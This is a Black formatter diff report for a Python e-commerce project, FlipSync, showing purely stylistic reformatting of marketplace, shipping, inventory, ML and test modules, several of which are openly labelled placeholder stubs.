@@ -63,7 +64,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for API/Services
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/marketplace/amazon/test_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/marketplace/ebay/compat.py	2025-06-14 20:35:30.839849+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/marketplace/ebay/compat.py	2025-06-19 04:04:08.963142+00:00
@@ -14,30 +14,30 @@
 
 
 def get_ebay_service() -> EbayService:
     """
     Get the global eBay service instance.
-    
+
     Returns:
         EbayService: The eBay service instance
-        
+
     Raises:
         RuntimeError: If eBay service is not initialized
     """
     global _ebay_service
-    
+
     if _ebay_service is None:
         # Initialize with default configuration
         _ebay_service = EbayService()
-    
+
     return _ebay_service
 
 
 def set_ebay_service(service: EbayService) -> None:
     """
     Set the global eBay service instance.
-    
+
     Args:
         service: The eBay service instance to set
     """
     global _ebay_service
     _ebay_service = service
@@ -47,10 +47,6 @@
     """Reset the global eBay service instance."""
     global _ebay_service
     _ebay_service = None
 
 
-__all__ = [
-    "get_ebay_service",
-    "set_ebay_service", 
-    "reset_ebay_service"
-]
+__all__ = ["get_ebay_service", "set_ebay_service", "reset_ebay_service"]
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/marketplace/ebay/compat.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/marketplace/ebay/test_service.py	2025-06-14 20:35:30.839849+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/marketplace/ebay/test_service.py	2025-06-19 04:04:09.053725+00:00
@@ -1,11 +1,11 @@
 """
 API/Services Test module for marketplace_ebay_service
 
 This module contains API/Services focused tests for the migrated marketplace_ebay_service component.
 Tier: 1
-Note: 
+Note:
 """
 
 import pytest
 import sys
 from pathlib import Path
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from service import *
+
 
 class TestServiceAPIServices:
     """API/Services test class for service."""
 
     def test_import(self):
@@ -50,11 +51,11 @@
         assert True
 
     def test_primary_implementation_features(self):
         """Test features specific to PRIMARY implementation."""
         # TODO: Add tests for PRIMARY implementation features
-        # Note: 
+        # Note:
         assert True
 
     def test_consolidation_compliance(self):
         """Test compliance with consolidation strategy."""
         # TODO: Add tests for consolidation compliance
@@ -63,7 +64,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for API/Services
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/marketplace/ebay/test_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/logistics/shipping_service.py	2025-06-14 20:35:30.839849+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/logistics/shipping_service.py	2025-06-19 04:04:09.088237+00:00
@@ -1,10 +1,11 @@
 import logging
 from datetime import datetime, timezone
 from typing import Any, Dict, List, Optional
 
 import shippo  # Shippo API library
+
 # from pydantic import BaseSettings  # Requires pydantic-settings
 
 from fs_agt_clean.core.utils.config import get_settings
 from fs_agt_clean.core.utils.metrics import MetricsMixin
 
@@ -20,10 +21,11 @@
     """Shipping service settings."""
 
     def __init__(self):
         """Initialize shipping settings from environment."""
         import os
+
         # Use SHIPPO_TEST_TOKEN from environment, fallback to test key
         self.SHIPPO_API_KEY = os.getenv("SHIPPO_TEST_TOKEN", "test_key")
 
     class Config:
         """Pydantic config."""
@@ -37,11 +39,14 @@
     def __init__(self):
         """Initialize shipping service."""
         super().__init__()
         self.settings = ShippingSettings()
         shippo.api_key = self.settings.SHIPPO_API_KEY
-        logger.info("Shippo API initialized with key: %s", self.settings.SHIPPO_API_KEY[:8] + "...")
+        logger.info(
+            "Shippo API initialized with key: %s",
+            self.settings.SHIPPO_API_KEY[:8] + "...",
+        )
         self.carriers = []
         self.parcel_templates = {}
         self._is_initialized = False
 
     async def ensure_initialized(self):
--- /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/test_infrastructure_integration.py	2025-06-14 20:35:30.839849+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/test_infrastructure_integration.py	2025-06-19 04:04:09.084004+00:00
@@ -21,25 +21,27 @@
     """Integration tests for infrastructure services."""
 
     @pytest.fixture
     async def infrastructure_coordinator(self):
         """Create and initialize infrastructure coordinator."""
-        coordinator = InfrastructureCoordinator({
-            "data_pipeline": {"batch_size": 100},
-            "monitoring": {"metrics_interval": 30},
-            "alerting": {"notification_channels": ["email", "slack"]},
-            "devops": {"environment": "test"}
-        })
+        coordinator = InfrastructureCoordinator(
+            {
+                "data_pipeline": {"batch_size": 100},
+                "monitoring": {"metrics_interval": 30},
+                "alerting": {"notification_channels": ["email", "slack"]},
+                "devops": {"environment": "test"},
+            }
+        )
         await coordinator.initialize()
         yield coordinator
         await coordinator.cleanup()
 
     @pytest.mark.asyncio
     async def test_infrastructure_initialization(self, infrastructure_coordinator):
         """Test infrastructure coordinator initialization."""
         assert infrastructure_coordinator.is_initialized
-        
+
         status = await infrastructure_coordinator.get_infrastructure_status()
         assert "coordinator" in status
         assert status["coordinator"]["initialized"]
         assert "services" in status
 
@@ -49,69 +51,69 @@
         # Test data batch processing
         test_batch = [
             {"asin": "B001", "title": "Test Product 1", "price": 29.99},
             {"asin": "B002", "title": "Test Product 2", "price": 39.99},
             {"asin": "", "title": "Invalid Product"},  # Should fail validation
-            {"asin": "B003", "title": "Test Product 3", "price": 19.99}
+            {"asin": "B003", "title": "Test Product 3", "price": 19.99},
         ]
-        
+
         result = await infrastructure_coordinator.process_data_batch(test_batch)
-        
+
         assert "batch_size" in result
         assert result["batch_size"] == 4
         assert "processed" in result
         assert "failed" in result
         assert result["processed"] == 3  # 3 valid products
-        assert result["failed"] == 1     # 1 invalid product
+        assert result["failed"] == 1  # 1 invalid product
         assert "success_rate" in result
         assert result["success_rate"] == 0.75
 
     @pytest.mark.asyncio
     async def test_monitoring_system_metrics(self, infrastructure_coordinator):
         """Test monitoring system metrics collection."""
         metrics = await infrastructure_coordinator.get_system_metrics()
-        
+
         # Check system metrics
         assert "system" in metrics
         system_metrics = metrics["system"]
         assert "cpu_usage" in system_metrics
         assert "memory_usage" in system_metrics
         assert "disk_usage" in system_metrics
         assert "network_io" in system_metrics
-        
+
         # Check application metrics
         assert "application" in metrics
         app_metrics = metrics["application"]
         assert "active_agents" in app_metrics
         assert "processed_requests" in app_metrics
         assert "error_rate" in app_metrics
         assert "response_time_avg" in app_metrics
-        
+
         # Check infrastructure metrics
         assert "infrastructure" in metrics
         infra_metrics = metrics["infrastructure"]
         assert "kubernetes_pods" in infra_metrics
         assert "database_connections" in infra_metrics
 
     @pytest.mark.asyncio
     async def test_alerting_system(self, infrastructure_coordinator):
         """Test alerting system functionality."""
         alerts = await infrastructure_coordinator.get_active_alerts()
-        
+
         assert "alerts" in alerts
         assert "summary" in alerts
-        
+
         # Check alert structure
         if alerts["alerts"]:
             alert = alerts["alerts"][0]
             assert "id" in alert
             assert "severity" in alert
             assert "title" in alert
             assert "description" in alert
             assert "timestamp" in alert
             assert "status" in alert
-        
+
         # Check summary
         summary = alerts["summary"]
         assert "total" in summary
         assert "critical" in summary
         assert "warning" in summary
@@ -119,69 +121,71 @@
 
     @pytest.mark.asyncio
     async def test_deployment_status(self, infrastructure_coordinator):
         """Test Kubernetes deployment status monitoring."""
         deployment_status = await infrastructure_coordinator.get_deployment_status()
-        
+
         # Check namespaces
         assert "namespaces" in deployment_status
         namespaces = deployment_status["namespaces"]
         expected_namespaces = ["production", "staging", "development"]
         for ns in expected_namespaces:
             if ns in namespaces:
                 assert "status" in namespaces[ns]
                 assert "pods" in namespaces[ns]
-        
+
         # Check deployments
         assert "deployments" in deployment_status
         deployments = deployment_status["deployments"]
         expected_deployments = ["api-service", "agent-system", "database"]
         for deployment in expected_deployments:
             if deployment in deployments:
                 assert "replicas" in deployments[deployment]
                 assert "ready" in deployments[deployment]
                 assert "status" in deployments[deployment]
-        
+
         # Check services
         assert "services" in deployment_status
         services = deployment_status["services"]
         for service_name, service_info in services.items():
             assert "type" in service_info
             assert "status" in service_info
 
     @pytest.mark.asyncio
-    async def test_infrastructure_status_comprehensive(self, infrastructure_coordinator):
+    async def test_infrastructure_status_comprehensive(
+        self, infrastructure_coordinator
+    ):
         """Test comprehensive infrastructure status reporting."""
         status = await infrastructure_coordinator.get_infrastructure_status()
-        
+
         # Check coordinator status
         assert "coordinator" in status
         coordinator_status = status["coordinator"]
         assert coordinator_status["initialized"]
-        
+
         # Check service status
         assert "services" in status
         services = status["services"]
         expected_services = ["data_pipeline", "monitoring", "alerting", "metrics"]
         for service in expected_services:
             assert service in services
-        
+
         # Check data pipeline status
         assert "data_pipeline" in status
         pipeline_status = status["data_pipeline"]
         assert "status" in pipeline_status
         assert "components" in pipeline_status
         expected_components = ["acquisition", "validation", "transformation", "storage"]
         for component in expected_components:
             assert component in pipeline_status["components"]
-        
+
         # Check monitoring status
         assert "monitoring" in status
         monitoring_status = status["monitoring"]
         assert "status" in monitoring_status
         assert "components" in monitoring_status
-        
+
         # Check DevOps status
         assert "devops" in status
         devops_status = status["devops"]
         assert "kubernetes" in devops_status
         assert "deployments" in devops_status
@@ -191,38 +195,40 @@
         """Test data pipeline error handling."""
         # Test with empty batch
         result = await infrastructure_coordinator.process_data_batch([])
         assert result["batch_size"] == 0
         assert result["success_rate"] == 0
-        
+
         # Test with malformed data
         malformed_batch = [
             {"invalid": "data"},
             {"asin": None},
-            {"asin": "B001", "title": "Valid Product", "price": 29.99}
+            {"asin": "B001", "title": "Valid Product", "price": 29.99},
         ]
-        
+
         result = await infrastructure_coordinator.process_data_batch(malformed_batch)
         assert result["batch_size"] == 3
         assert result["failed"] >= 2  # At least 2 should fail
         assert result["processed"] <= 1  # At most 1 should succeed
 
     @pytest.mark.asyncio
     async def test_service_availability_handling(self, infrastructure_coordinator):
         """Test handling of unavailable services."""
         # Simulate service unavailability by checking error responses
-        
+
         # If data pipeline is unavailable
         if infrastructure_coordinator.service_status["data_pipeline"] != "active":
-            result = await infrastructure_coordinator.process_data_batch([{"test": "data"}])
+            result = await infrastructure_coordinator.process_data_batch(
+                [{"test": "data"}]
+            )
             assert "error" in result
-        
+
         # If metrics are unavailable
         if infrastructure_coordinator.service_status["metrics"] != "active":
             result = await infrastructure_coordinator.get_system_metrics()
             assert "error" in result
-        
+
         # If alerting is unavailable
         if infrastructure_coordinator.service_status["alerting"] != "active":
             result = await infrastructure_coordinator.get_active_alerts()
             assert "error" in result
 
@@ -233,21 +239,21 @@
         tasks = [
             infrastructure_coordinator.get_infrastructure_status(),
             infrastructure_coordinator.get_system_metrics(),
             infrastructure_coordinator.get_active_alerts(),
             infrastructure_coordinator.get_deployment_status(),
-            infrastructure_coordinator.process_data_batch([
-                {"asin": "B001", "title": "Test Product", "price": 29.99}
-            ])
+            infrastructure_coordinator.process_data_batch(
+                [{"asin": "B001", "title": "Test Product", "price": 29.99}]
+            ),
         ]
-        
+
         results = await asyncio.gather(*tasks, return_exceptions=True)
-        
+
         # Check that most operations succeeded
         successful_results = [r for r in results if not isinstance(r, Exception)]
         assert len(successful_results) >= len(tasks) * 0.8  # At least 80% success rate
-        
+
         # Check that each result has expected structure
         for result in successful_results:
             if isinstance(result, dict):
                 assert "timestamp" in result or "error" in result
 
@@ -255,15 +261,15 @@
     async def test_infrastructure_cleanup(self, infrastructure_coordinator):
         """Test proper cleanup of infrastructure services."""
         # Verify services are active before cleanup
         status_before = await infrastructure_coordinator.get_infrastructure_status()
         assert status_before["coordinator"]["initialized"]
-        
+
         # Perform cleanup
         cleanup_result = await infrastructure_coordinator.cleanup()
         assert cleanup_result["status"] == "success"
-        
+
         # Verify cleanup was successful
         assert not infrastructure_coordinator.is_initialized
         for service in infrastructure_coordinator.service_status.values():
             assert service == "shutdown"
 
@@ -273,52 +279,50 @@
         # Create a large data batch
         large_batch = [
             {"asin": f"B{i:03d}", "title": f"Product {i}", "price": 10.0 + i}
             for i in range(100)
         ]
-        
+
         # Process the batch and measure performance
         start_time = datetime.now()
         result = await infrastructure_coordinator.process_data_batch(large_batch)
         end_time = datetime.now()
-        
+
         processing_time = (end_time - start_time).total_seconds()
-        
+
         # Verify results
         assert result["batch_size"] == 100
         assert result["processed"] == 100  # All should be valid
         assert result["success_rate"] == 1.0
-        
+
         # Performance should be reasonable (less than 5 seconds for 100 items)
         assert processing_time < 5.0
 
 
 if __name__ == "__main__":
     # Run basic infrastructure test
     async def run_basic_test():
         coordinator = InfrastructureCoordinator()
         init_result = await coordinator.initialize()
-        
+
         print(f" Infrastructure initialized: {init_result['status']}")
-        
+
         # Test data processing
-        test_data = [
-            {"asin": "B001", "title": "Test Product", "price": 29.99}
-        ]
+        test_data = [{"asin": "B001", "title": "Test Product", "price": 29.99}]
         process_result = await coordinator.process_data_batch(test_data)
         print(f" Data processing: {process_result['success_rate']} success rate")
-        
+
         # Test monitoring
         metrics = await coordinator.get_system_metrics()
         if "error" not in metrics:
             print(f" Monitoring: {len(metrics)} metric categories")
-        
+
         # Test deployment status
         deployment = await coordinator.get_deployment_status()
         if "error" not in deployment:
             print(f" Deployment: {len(deployment['deployments'])} deployments")
-        
+
         await coordinator.cleanup()
         print(" Infrastructure integration test completed successfully")
 
     # Run the test
     asyncio.run(run_basic_test())
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/logistics/shipping_service.py
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/test_infrastructure_integration.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/market_analysis/__init__.py	2025-06-14 20:35:30.839849+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/market_analysis/__init__.py	2025-06-19 04:04:09.156568+00:00
@@ -63,22 +63,23 @@
         self.vector_store = vector_store
         self.metric_collector = metric_collector
 
         # Initialize components
         self.market_analyzer = MarketAnalyzer() if MarketAnalyzer else None
-        self.competitor_analyzer = CompetitorAnalyzer(
-            vector_store=vector_store,
-            metric_collector=metric_collector
-        ) if CompetitorAnalyzer and vector_store else None
+        self.competitor_analyzer = (
+            CompetitorAnalyzer(
+                vector_store=vector_store, metric_collector=metric_collector
+            )
+            if CompetitorAnalyzer and vector_store
+            else None
+        )
         self.advanced_search = AdvancedSearch() if AdvancedSearch else None
         self.search_analytics = SearchAnalytics() if SearchAnalytics else None
         self.search_service = SearchService() if SearchService else None
 
     async def analyze_market_trends(
-        self,
-        category_id: str,
-        timeframe: str = "30d"
+        self, category_id: str, timeframe: str = "30d"
     ) -> Dict:
         """Analyze market trends for a category."""
         try:
             if not self.market_analyzer:
                 return {"error": "Market analyzer not available"}
@@ -86,20 +87,18 @@
             trends = await self.market_analyzer.analyze_trends(category_id, timeframe)
             return {
                 "category_id": category_id,
                 "timeframe": timeframe,
                 "trends": trends,
-                "analysis_timestamp": "2024-01-01T00:00:00Z"
+                "analysis_timestamp": "2024-01-01T00:00:00Z",
             }
         except Exception as e:
             logger.error("Failed to analyze market trends: %s", str(e))
             return {"error": str(e)}
 
     async def analyze_competitors(
-        self,
-        category_id: str,
-        product_data: Dict
+        self, category_id: str, product_data: Dict
     ) -> List[Dict]:
         """Analyze competitors using vector similarity."""
         try:
             if not self.competitor_analyzer:
                 return []
@@ -115,22 +114,20 @@
                     "price_position": profile.price_position,
                     "market_share": profile.market_share,
                     "strengths": profile.strengths,
                     "weaknesses": profile.weaknesses,
                     "threat_level": profile.threat_level,
-                    "last_updated": profile.last_updated.isoformat()
+                    "last_updated": profile.last_updated.isoformat(),
                 }
                 for profile in competitor_profiles
             ]
         except Exception as e:
             logger.error("Failed to analyze competitors: %s", str(e))
             return []
 
     async def perform_advanced_search(
-        self,
-        query: str,
-        filters: Optional[Dict] = None
+        self, query: str, filters: Optional[Dict] = None
     ) -> Dict:
         """Perform advanced search with analytics."""
         try:
             if not self.advanced_search:
                 return {"error": "Advanced search not available"}
@@ -142,35 +139,29 @@
                 analytics = await self.search_analytics.analyze_results(search_results)
                 return {
                     "query": query,
                     "filters": filters,
                     "results": search_results,
-                    "analytics": analytics
+                    "analytics": analytics,
                 }
 
-            return {
-                "query": query,
-                "filters": filters,
-                "results": search_results
-            }
+            return {"query": query, "filters": filters, "results": search_results}
         except Exception as e:
             logger.error("Failed to perform advanced search: %s", str(e))
             return {"error": str(e)}
 
     async def get_market_intelligence(
-        self,
-        category_id: str,
-        product_data: Optional[Dict] = None
+        self, category_id: str, product_data: Optional[Dict] = None
     ) -> Dict:
         """Get comprehensive market intelligence."""
         try:
             intelligence = {
                 "category_id": category_id,
                 "market_trends": {},
                 "competitor_analysis": [],
                 "search_insights": {},
-                "recommendations": []
+                "recommendations": [],
             }
 
             # Get market trends
             if self.market_analyzer:
                 trends = await self.analyze_market_trends(category_id)
@@ -181,45 +172,44 @@
                 competitors = await self.analyze_competitors(category_id, product_data)
                 intelligence["competitor_analysis"] = competitors
 
             # Generate recommendations based on analysis
             intelligence["recommendations"] = self._generate_recommendations(
-                intelligence["market_trends"],
-                intelligence["competitor_analysis"]
+                intelligence["market_trends"], intelligence["competitor_analysis"]
             )
 
             return intelligence
         except Exception as e:
             logger.error("Failed to get market intelligence: %s", str(e))
             return {"error": str(e)}
 
     def _generate_recommendations(
-        self,
-        market_trends: Dict,
-        competitor_analysis: List[Dict]
+        self, market_trends: Dict, competitor_analysis: List[Dict]
     ) -> List[str]:
         """Generate recommendations based on market analysis."""
         recommendations = []
 
         # Basic recommendations based on available data
         if market_trends.get("trends"):
             recommendations.append("Monitor market trends for pricing opportunities")
 
         if competitor_analysis:
             high_threat_competitors = [
-                c for c in competitor_analysis
-                if c.get("threat_level") == "high"
+                c for c in competitor_analysis if c.get("threat_level") == "high"
             ]
             if high_threat_competitors:
-                recommendations.append("Focus on differentiation from high-threat competitors")
+                recommendations.append(
+                    "Focus on differentiation from high-threat competitors"
+                )
 
             low_price_competitors = [
-                c for c in competitor_analysis
-                if c.get("price_position") == "lower"
+                c for c in competitor_analysis if c.get("price_position") == "lower"
             ]
             if low_price_competitors:
-                recommendations.append("Consider value-based positioning against lower-priced competitors")
+                recommendations.append(
+                    "Consider value-based positioning against lower-priced competitors"
+                )
 
         return recommendations
 
 
 __all__ = [
@@ -232,6 +222,6 @@
     "SearchService",
     "SearchQuery",
     "SearchResult",
     "MarketTrend",
     "CompetitorData",
-]
\ No newline at end of file
+]
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/market_analysis/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/ml/__init__.py	2025-06-14 20:35:30.843858+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/ml/__init__.py	2025-06-19 04:04:09.233563+00:00
@@ -6,6 +6,6 @@
 prediction services, and ML-powered features.
 """
 
 from .service import MLService
 
-__all__ = ['MLService']
+__all__ = ["MLService"]
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/ml/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/marketplace_integration/test_seo_optimizer.py	2025-06-14 20:35:30.843858+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/marketplace_integration/test_seo_optimizer.py	2025-06-19 04:04:09.235719+00:00
@@ -6,30 +6,32 @@
 
 import pytest
 import sys
 from pathlib import Path
 
+
 class TestSeoOptimizerService:
     """Test class for seo_optimizer service."""
-    
+
     def test_import(self):
         """Test service import."""
         assert True
-    
+
     def test_service_functionality(self):
         """Test core service functionality."""
         assert True
-    
+
     def test_integration_compatibility(self):
         """Test integration with other services."""
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant service implementations."""
         assert True
-    
+
     def test_vision_alignment(self):
         """Test alignment with agentic system vision."""
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/marketplace_integration/test_seo_optimizer.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/inventory/service.py	2025-06-14 20:35:30.839849+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/inventory/service.py	2025-06-19 04:04:09.401008+00:00
@@ -219,11 +219,13 @@
             if not item:
                 raise ValueError(f"Inventory item not found: {inventory_id}")
 
             # Check if the item belongs to the seller
             if item.user_id != seller_id:
-                raise ValueError(f"Inventory item {inventory_id} does not belong to seller {seller_id}")
+                raise ValueError(
+                    f"Inventory item {inventory_id} does not belong to seller {seller_id}"
+                )
 
             # Update the item
             update_data = {}
             if "name" in product_data:
                 update_data["name"] = product_data["name"]
@@ -301,11 +303,13 @@
             if not item:
                 raise ValueError(f"Inventory item not found: {inventory_id}")
 
             # Check if the item belongs to the seller
             if item.user_id != seller_id:
-                raise ValueError(f"Inventory item {inventory_id} does not belong to seller {seller_id}")
+                raise ValueError(
+                    f"Inventory item {inventory_id} does not belong to seller {seller_id}"
+                )
 
             # Delete the item
             await self.inventory_repository.delete(inventory_id)
 
             # Record metrics
@@ -366,11 +370,13 @@
             if not item:
                 raise ValueError(f"Inventory item not found: {inventory_id}")
 
             # Check if the item belongs to the seller
             if item.user_id != seller_id:
-                raise ValueError(f"Inventory item {inventory_id} does not belong to seller {seller_id}")
+                raise ValueError(
+                    f"Inventory item {inventory_id} does not belong to seller {seller_id}"
+                )
 
             # Update the quantity
             old_quantity = item.quantity
             await self.inventory_repository.update_quantity(inventory_id, quantity)
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/inventory/service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/ml/service.py	2025-06-14 20:35:30.843858+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/ml/service.py	2025-06-19 04:04:09.749024+00:00
@@ -15,23 +15,23 @@
 
 
 class MLService:
     """
     Machine Learning service for FlipSync.
-    
+
     This service provides ML capabilities including:
     - Model management and loading
     - Prediction services
     - ML-powered features for eBay optimization
     - Performance analytics and insights
     """
-    
+
     def __init__(
         self,
         config: Optional[Dict[str, Any]] = None,
         config_manager: Optional[Any] = None,
-        metrics_service: Optional[Any] = None
+        metrics_service: Optional[Any] = None,
     ):
         """
         Initialize the ML service.
 
         Args:
@@ -44,206 +44,204 @@
         self.metrics_service = metrics_service
         self.models = {}
         self.is_initialized = False
 
         logger.info("MLService initialized")
-    
+
     async def initialize(self) -> bool:
         """
         Initialize the ML service.
-        
+
         Returns:
             bool: True if initialization successful, False otherwise
         """
         try:
             # Initialize ML models and services
             await self._load_models()
             self.is_initialized = True
             logger.info("MLService initialization completed successfully")
             return True
-            
+
         except Exception as e:
             logger.error(f"Failed to initialize MLService: {e}")
             return False
-    
+
     async def _load_models(self):
         """Load ML models for various features."""
         # Placeholder for model loading
         # In a real implementation, this would load actual ML models
         self.models = {
-            'price_predictor': None,  # Price optimization model
-            'demand_forecaster': None,  # Demand forecasting model
-            'category_classifier': None,  # Product category classification
-            'sentiment_analyzer': None,  # Review sentiment analysis
-            'recommendation_engine': None,  # Product recommendation
+            "price_predictor": None,  # Price optimization model
+            "demand_forecaster": None,  # Demand forecasting model
+            "category_classifier": None,  # Product category classification
+            "sentiment_analyzer": None,  # Review sentiment analysis
+            "recommendation_engine": None,  # Product recommendation
         }
         logger.info("ML models loaded successfully")
-    
+
     async def predict_optimal_price(
-        self, 
-        product_data: Dict[str, Any],
-        market_data: Optional[Dict[str, Any]] = None
+        self, product_data: Dict[str, Any], market_data: Optional[Dict[str, Any]] = None
     ) -> Dict[str, Any]:
         """
         Predict optimal price for a product.
-        
+
         Args:
             product_data: Product information
             market_data: Market analysis data
-            
+
         Returns:
             Dict containing price prediction and confidence
         """
         if not self.is_initialized:
-            logger.warning("MLService not initialized, returning default price prediction")
+            logger.warning(
+                "MLService not initialized, returning default price prediction"
+            )
             return {
-                'predicted_price': product_data.get('current_price', 0),
-                'confidence': 0.0,
-                'factors': ['service_not_initialized'],
-                'timestamp': datetime.utcnow().isoformat()
+                "predicted_price": product_data.get("current_price", 0),
+                "confidence": 0.0,
+                "factors": ["service_not_initialized"],
+                "timestamp": datetime.utcnow().isoformat(),
             }
-        
+
         # Placeholder implementation
         # In a real implementation, this would use actual ML models
-        current_price = product_data.get('current_price', 0)
+        current_price = product_data.get("current_price", 0)
         predicted_price = current_price * 1.05  # Simple 5% increase as placeholder
-        
-        return {
-            'predicted_price': predicted_price,
-            'confidence': 0.75,
-            'factors': ['market_demand', 'competition', 'seasonality'],
-            'timestamp': datetime.utcnow().isoformat()
-        }
-    
+
+        return {
+            "predicted_price": predicted_price,
+            "confidence": 0.75,
+            "factors": ["market_demand", "competition", "seasonality"],
+            "timestamp": datetime.utcnow().isoformat(),
+        }
+
     async def analyze_market_demand(
-        self, 
-        category: str,
-        keywords: List[str]
+        self, category: str, keywords: List[str]
     ) -> Dict[str, Any]:
         """
         Analyze market demand for a product category.
-        
+
         Args:
             category: Product category
             keywords: Product keywords
-            
+
         Returns:
             Dict containing demand analysis
         """
         if not self.is_initialized:
-            logger.warning("MLService not initialized, returning default demand analysis")
+            logger.warning(
+                "MLService not initialized, returning default demand analysis"
+            )
             return {
-                'demand_score': 0.5,
-                'trend': 'stable',
-                'confidence': 0.0,
-                'timestamp': datetime.utcnow().isoformat()
+                "demand_score": 0.5,
+                "trend": "stable",
+                "confidence": 0.0,
+                "timestamp": datetime.utcnow().isoformat(),
             }
-        
-        # Placeholder implementation
-        return {
-            'demand_score': 0.8,
-            'trend': 'increasing',
-            'confidence': 0.85,
-            'seasonal_factors': ['holiday_season'],
-            'timestamp': datetime.utcnow().isoformat()
-        }
-    
+
+        # Placeholder implementation
+        return {
+            "demand_score": 0.8,
+            "trend": "increasing",
+            "confidence": 0.85,
+            "seasonal_factors": ["holiday_season"],
+            "timestamp": datetime.utcnow().isoformat(),
+        }
+
     async def classify_product_category(
-        self, 
-        title: str,
-        description: str
+        self, title: str, description: str
     ) -> Dict[str, Any]:
         """
         Classify product into appropriate category.
-        
+
         Args:
             title: Product title
             description: Product description
-            
+
         Returns:
             Dict containing category classification
         """
         if not self.is_initialized:
-            logger.warning("MLService not initialized, returning default classification")
+            logger.warning(
+                "MLService not initialized, returning default classification"
+            )
             return {
-                'category': 'Other',
-                'confidence': 0.0,
-                'subcategories': [],
-                'timestamp': datetime.utcnow().isoformat()
+                "category": "Other",
+                "confidence": 0.0,
+                "subcategories": [],
+                "timestamp": datetime.utcnow().isoformat(),
             }
-        
-        # Placeholder implementation
-        return {
-            'category': 'Electronics',
-            'confidence': 0.9,
-            'subcategories': ['Consumer Electronics', 'Gadgets'],
-            'timestamp': datetime.utcnow().isoformat()
-        }
-    
+
+        # Placeholder implementation
+        return {
+            "category": "Electronics",
+            "confidence": 0.9,
+            "subcategories": ["Consumer Electronics", "Gadgets"],
+            "timestamp": datetime.utcnow().isoformat(),
+        }
+
     async def generate_recommendations(
-        self, 
-        user_id: str,
-        context: Dict[str, Any]
+        self, user_id: str, context: Dict[str, Any]
     ) -> List[Dict[str, Any]]:
         """
         Generate product recommendations for a user.
-        
+
         Args:
             user_id: User identifier
             context: Context information
-            
+
         Returns:
             List of product recommendations
         """
         if not self.is_initialized:
             logger.warning("MLService not initialized, returning empty recommendations")
             return []
-        
+
         # Placeholder implementation
         return [
             {
-                'product_id': 'rec_001',
-                'title': 'Recommended Product 1',
-                'confidence': 0.85,
-                'reason': 'Based on your browsing history'
+                "product_id": "rec_001",
+                "title": "Recommended Product 1",
+                "confidence": 0.85,
+                "reason": "Based on your browsing history",
             },
             {
-                'product_id': 'rec_002',
-                'title': 'Recommended Product 2',
-                'confidence': 0.78,
-                'reason': 'Popular in your category'
-            }
+                "product_id": "rec_002",
+                "title": "Recommended Product 2",
+                "confidence": 0.78,
+                "reason": "Popular in your category",
+            },
         ]
-    
+
     async def health_check(self) -> Dict[str, Any]:
         """
         Perform health check on ML service.
-        
+
         Returns:
             Dict containing health status
         """
         return {
-            'status': 'healthy' if self.is_initialized else 'not_initialized',
-            'models_loaded': len([m for m in self.models.values() if m is not None]),
-            'total_models': len(self.models),
-            'timestamp': datetime.utcnow().isoformat()
-        }
-    
+            "status": "healthy" if self.is_initialized else "not_initialized",
+            "models_loaded": len([m for m in self.models.values() if m is not None]),
+            "total_models": len(self.models),
+            "timestamp": datetime.utcnow().isoformat(),
+        }
+
     def get_service_info(self) -> Dict[str, Any]:
         """
         Get service information.
-        
+
         Returns:
             Dict containing service information
         """
         return {
-            'name': 'MLService',
-            'version': '1.0.0',
-            'initialized': self.is_initialized,
-            'capabilities': [
-                'price_prediction',
-                'demand_analysis',
-                'category_classification',
-                'recommendations'
+            "name": "MLService",
+            "version": "1.0.0",
+            "initialized": self.is_initialized,
+            "capabilities": [
+                "price_prediction",
+                "demand_analysis",
+                "category_classification",
+                "recommendations",
             ],
-            'models': list(self.models.keys())
-        }
+            "models": list(self.models.keys()),
+        }
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/ml/service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/notifications/compat.py	2025-06-14 20:35:30.843858+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/notifications/compat.py	2025-06-19 04:04:09.921786+00:00
@@ -14,30 +14,30 @@
 
 
 def get_notification_service() -> NotificationService:
     """
     Get the global notification service instance.
-    
+
     Returns:
         NotificationService: The notification service instance
-        
+
     Raises:
         RuntimeError: If notification service is not initialized
     """
     global _notification_service
-    
+
     if _notification_service is None:
         # Initialize with default configuration
         _notification_service = NotificationService()
-    
+
     return _notification_service
 
 
 def set_notification_service(service: NotificationService) -> None:
     """
     Set the global notification service instance.
-    
+
     Args:
         service: The notification service instance to set
     """
     global _notification_service
